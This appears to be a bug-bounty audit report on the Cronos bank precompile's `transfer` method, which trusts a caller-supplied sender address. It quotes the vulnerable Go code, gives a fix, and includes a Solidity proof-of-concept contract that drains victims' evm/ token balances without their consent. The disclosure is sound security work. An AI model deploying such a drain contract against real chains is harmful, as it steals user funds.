### Title
Bank Precompile `transfer` Allows Any Deployed Contract to Drain Arbitrary Holders of Its Own `evm/` Denom Without Authorization — (`File: x/cronos/keeper/precompiles/bank.go`)

---

### Summary

The bank precompile's `transfer(address sender, address recipient, uint256 amount)` method accepts the `sender` address as a caller-supplied argument and uses it directly as the source of funds, with no check that `sender` is the calling contract or has approved the transfer. Any deployed contract can call `bank.transfer(victimAddress, attackerAddress, amount)` to move `evm/<callerContract>` native tokens out of any holder's account without their consent.

---

### Finding Description

In `BankContract.Run()`, the `TransferMethodName` branch unpacks `sender` from ABI-decoded arguments and passes it directly to `bankKeeper.SendCoins`:

```go
// x/cronos/keeper/precompiles/bank.go  lines 175–196
sender := args[0].(common.Address)
recipient := args[1].(common.Address)
amount := args[2].(*big.Int)
...
from := sdk.AccAddress(sender.Bytes())   // ← caller-supplied, never verified
to   := sdk.AccAddress(recipient.Bytes())
...
denom := EVMDenom(contract.Caller())     // "evm/<callerContractAddress>"
amt   := sdk.NewCoin(denom, sdkmath.NewIntFromBigInt(amount))
...
bc.bankKeeper.SendCoins(ctx, from, to, sdk.NewCoins(amt))
``` [1](#0-0) 

There is no assertion that `from == contract.Caller()`, no ERC20-style allowance check, and no other authorization gate. The denom is scoped to `"evm/" + contract.Caller().Hex()`, so the calling contract can only move tokens of its own denom — but it can move them **from any address that holds that denom**, to any destination, in any amount.

This is structurally identical to the Treasury bug class: a function that accepts an arbitrary `(sender, amount)` pair and executes a transfer without verifying that the sender authorized it.

The `mint` path in the same branch also accepts an arbitrary `recipient` and mints unbounded supply of `evm/<caller>` tokens to that address, but minting is arguably the intended issuer privilege. The `transfer` path is the critical one because it moves tokens **away from users who already hold them**. [2](#0-1) 

The bank precompile is a production feature registered in the chain's EVM precompile set at address `0x0000000000000000000000000000000000000064`. [3](#0-2) 

---

### Impact Explanation

**Critical — Unauthorized transfer of precompile-controlled assets.**

Any deployed contract can drain the full `evm/<contract>` native-token balance of any account that holds those tokens, transferring them to an attacker-controlled address. This satisfies the allowed Critical impact: *"Unauthorized transfer of CRC20, ERC20, or precompile-controlled assets."*

The `evm/` denom tokens are first-class Cosmos bank module coins. They can be held by users, sent via IBC, and used in DeFi protocols built on Cronos. A drain of these balances is a direct, irreversible loss of user funds.

---

### Likelihood Explanation

Any account can deploy an EVM contract on Cronos — no special permission is required. The attacker path requires only:

1. Deploying a contract (unprivileged).
2. Users holding `evm/<contract>` tokens — which occurs naturally whenever a protocol uses the bank precompile to issue native tokens to users (e.g., via `bank.mint`).

The `TestBank.sol` integration contract demonstrates exactly this pattern: it calls `bank.mint` to issue tokens and `bank.transfer` to move them. [4](#0-3) 

---

### Recommendation

In the `TransferMethodName` case, enforce that the `sender` argument equals `contract.Caller()`:

```go
if sender != contract.Caller() {
    return nil, errors.New("transfer: sender must be the calling contract")
}
```

Alternatively, implement an ERC20-style allowance mapping inside the precompile so that users can explicitly approve a contract to move their `evm/<contract>` tokens on their behalf.

---

### Proof of Concept

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.4;

interface IBankModule {
    function mint(address, uint256) external payable returns (bool);
    function transfer(address, address, uint256) external payable returns (bool);
}

contract AttackerContract {
    IBankModule constant bank = IBankModule(0x0000000000000000000000000000000000000064);

    // Step 1: issue evm/<this> tokens to victim (e.g. as part of a DeFi deposit)
    function issueToVictim(address victim, uint256 amount) external {
        bank.mint(victim, amount);
        // victim now holds `amount` of evm/<this> in the Cosmos bank module
    }

    // Step 2: drain victim's balance without any approval
    function drain(address victim, address attacker, uint256 amount) external {
        // sender = victim (caller-supplied, not verified by precompile)
        bank.transfer(victim, attacker, amount);
        // victim's evm/<this> balance is now zero; attacker holds `amount`
    }
}
```

1. Deploy `AttackerContract` at `0xABC`.
2. Call `issueToVictim(victim, 1000)` — victim holds 1000 `evm/0xABC` tokens.
3. Call `drain(victim, attacker, 1000)` — precompile executes `SendCoins(victim → attacker, 1000 evm/0xABC)` with no consent from victim.
4. Victim's balance is zero; attacker holds 1000 `evm/0xABC`.

The `bankKeeper.SendCoins` call succeeds because the only check is that `from` has sufficient balance — there is no authorization check on whether `from` approved the calling contract to spend its tokens. [5](#0-4)
